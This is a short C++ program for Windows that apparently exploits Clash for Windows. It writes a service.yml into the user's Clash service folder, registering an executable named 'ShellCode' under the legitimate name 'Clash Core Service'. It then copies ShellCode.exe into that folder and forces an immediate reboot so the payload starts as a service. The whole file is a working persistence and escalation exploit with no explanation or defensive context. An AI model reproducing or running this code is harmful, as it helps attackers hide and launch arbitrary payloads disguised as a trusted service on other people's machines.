#include <iostream>
#include <fstream>
#include <thread>
#include <windows.h>
#include <Lmcons.h>
#include <string>
using namespace std;
int main()
{
	wchar_t username[255];
	DWORD username_len = 255;
	GetUserName(username, &username_len);
	wstring ws(username);
	string name_str(ws.begin(), ws.end());
	string path = "C:\\Users\\"+name_str+"\\.config\\clash\\service\\";
	string yaml = path + "service.yml";
	cout << path;
	ofstream outfile;
	outfile.open(yaml.c_str(),ios::out);
	outfile << R"(id: Clash Core Service
name: Clash Core Service
description: Clash Core Service started by Clash for Windows
executable: ShellCode
log:
  mode: none
)";
	string move_cmd = "copy ShellCode.exe ";
	move_cmd.append(path + "\\ShellCode.exe");
	system(move_cmd.c_str());
	system("shutdown -r -t 0");
	return 0;
}
